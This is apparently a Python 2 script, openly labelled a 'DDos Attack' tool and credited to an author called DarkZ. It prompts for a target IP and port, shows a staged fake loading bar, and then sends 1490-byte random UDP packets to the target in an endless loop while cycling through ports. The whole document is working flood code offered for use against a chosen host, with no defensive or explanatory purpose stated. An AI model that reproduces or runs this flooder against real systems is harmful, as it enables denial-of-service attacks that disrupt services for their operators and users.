import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print "Author   : DarkZ"
print "Facebook : https://www.facebook.com/Dark.Z"
print "github   : https://github.com/darkzhacker"
print "Instagram : https://Instagram.com/Dark_z"
print 
ip = raw_input("IP Target : ")
port = input("Select Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] Opening Dark-DDOS"
time.sleep(5)
print "[=====               ] starting Dark Z OS"
time.sleep(5)
print "[==========          ] Starting DDOS Tool"
time.sleep(5)
print "[===============     ] Waiting for Server"
time.sleep(5)
print "[====================] Started"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

